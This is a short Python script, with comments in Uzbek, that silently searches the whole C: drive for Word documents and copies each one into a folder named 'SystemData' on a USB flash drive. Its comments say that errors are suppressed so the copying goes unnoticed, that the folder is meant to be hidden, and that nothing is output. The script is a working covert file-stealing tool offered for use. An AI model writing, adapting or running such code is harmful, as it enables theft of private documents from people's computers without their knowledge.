import os
import shutil

def find_and_copy_word_files(search_dir, usb_dir):
    for root, dirs, files in os.walk(search_dir):
        for file in files:
            if file.endswith(".doc") or file.endswith(".docx"):
                try:
                    full_path = os.path.join(root, file)
                    # Faylni ko'chirish
                    shutil.copy2(full_path, usb_dir)
                except Exception as e:
                    pass  # Xatolik bo‘lsa, davom etadi (sezdirmaslik uchun)

# 💡 Kompyuterning asosiy qismi (masalan C diski) bo'ylab qidirish
search_directory = "C:\\"

# 💡 USB fleshka yo'lini avtomatik aniqlash yoki aniq yozing
usb_drive = "E:\\"  # Fleshkaning harfi: E, F, G va h.k bo'lishi mumkin

# 💡 USBda yashirin papka yaratib, fayllarni o‘sha yerga saqlash
hidden_folder_path = os.path.join(usb_drive, "SystemData")
os.makedirs(hidden_folder_path, exist_ok=True)

# 📁 Fayllarni topish va ko'chirish
find_and_copy_word_files(search_directory, hidden_folder_path)

# 💬 Hamma narsa jim bo'ladi, hech narsa chiqarilmaydi
